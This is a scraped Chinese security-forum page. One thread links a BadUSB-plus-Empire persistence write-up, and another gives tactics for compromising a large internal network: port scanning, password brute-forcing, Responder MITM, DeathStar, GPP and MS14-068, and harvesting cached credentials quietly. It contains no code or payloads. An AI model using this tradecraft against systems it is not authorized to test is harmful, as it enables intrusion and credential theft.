<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 用心了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 谁可以帮忙把本圈的精华整理个2017集合，我们会很感激😋

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 做成ppt可以么。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: [白眼]你们平时都没时间的么

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: pdf/html方便传播，而且美观

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 创业苦逼呀，忙得要死

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: [捂脸]资源打包么  主要评论有的也有些干货

<img src="https://file.xiaomiquan.com/6f/26/6f26f50dfa361fc2967683dc5ec6c59eb715511dfeb0f6985900ac985d3d0ec5.jpg" width="25px"/> __王布斯__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: gitbook那种形式就行吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/6f/26/6f26f50dfa361fc2967683dc5ec6c59eb715511dfeb0f6985900ac985d3d0ec5.jpg" width="25px"/> __王布斯__: 也行呀

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 工作量其实不小，主要是还要分类，排版，哈哈，

<img src="https://file.xiaomiquan.com/eb/53/eb53a8909d2f0bfd345e71bfcc6b322fcd6e50c7ad2d00fc6eda5c3aa8b09c60.jpg" width="25px"/> __浩宇__: 可以吗 我有点感兴趣。觉得做gitbook 不错   但又担心做了会不会就没人付费进这个圈子了  而且有些东西会不会造成侵权什么的

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 还是学生，大把时间[呲牙]


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-24:


__#姿势#__

 BadUsb+Empire 让目标持久怀孕
胡乱写的，莫怪莫怪！[难过]
密码:alone

[http://hackerwing.com/2017/10/24/BadUsb-Empire-%E8%AE%A9%E7%9B%AE%E6%A0%87%E6%8C%81%E4%B9%85%E6%80%80%E5%AD%95/](http://hackerwing.com/2017/10/24/BadUsb-Empire-%E8%AE%A9%E7%9B%AE%E6%A0%87%E6%8C%81%E4%B9%85%E6%80%80%E5%AD%95/)





...

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 哈哈，手机上这个密码没用。只要把js禁用就行了。静态站点。QAQ

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 可以可以

<img src="https://file.xiaomiquan.com/c4/e2/c4e2337e4bf259351a4901662d84873c79cfb48880892a23d7c754b817ea4ad5.jpg" width="25px"/> __np__: 只有我觉得前端的效果好6么[发抖][发抖][发抖]

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: Badusb不管payload怎么改,调小调隐藏窗口，当插入别人电脑的时候终还是会有东西弹出来让别人察觉。然后taobao买了800多的橡皮鸭除了官方提供的payload比较全面之外也没有什么特别的地方，这些东西真的只能自己玩，然后以为做的隐藏比较完全，结果连客户鸟都不鸟这种东西。

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 喜欢这个博客的背景

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 因为人家是甲方！滑稽。

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 不是 是某部门具体要实战用

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 学生狗不懂，😢😢😢


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-23:

> 匿名用户 提问：
【漏洞挖掘思路】 cos前辈，面对内网数千台服务器（内网互访，数据库、操作系统、web容器等均不超过4种，安全设备透明），只有ip信息，如何通过人工高效挖掘漏洞，求战略性指导意见。


人工？我先不管你是不是一定要纯粹人工，如果不是，可以这样：

1. 大规模端口探测，看端口都开放了什么，找对应服务漏洞；
2. 爆破相关服务的密码；
3. 挖你说的这几个不是件容易的事，但有 0day 那就可以畅通无阻；
4. 别漏了路由器漏洞，嵌入式固件的漏洞挖掘相对容易些；
5. 玩玩 Responder MITM；
6. 有域控，试试 DeathStar；
7. 不用问我更多了，技巧也许会太多，一切看场景，而且还得看你能否更进一步。

擅于使用相关工具、掌握各类渗透技巧及掌握 Python 这类语言进行必要编码，才能高效。



...

<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 内网ftp服务器可以提权拿下吗，同服务器下还有个网站

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 目标不同，手法不同？拿到某个机器，还是控制整个内网？
切记，千万，千万不要用arp，尽量动静小点

看内网是域还是工作组。
域可以看看GPP ms14068
工作组相对来说麻烦一点(很难控制整个内网)
内网拿到一台机器之后，记着提取本地的缓存凭据，后续扩大渗透，还有看看进程是否有域管理员。


...

---


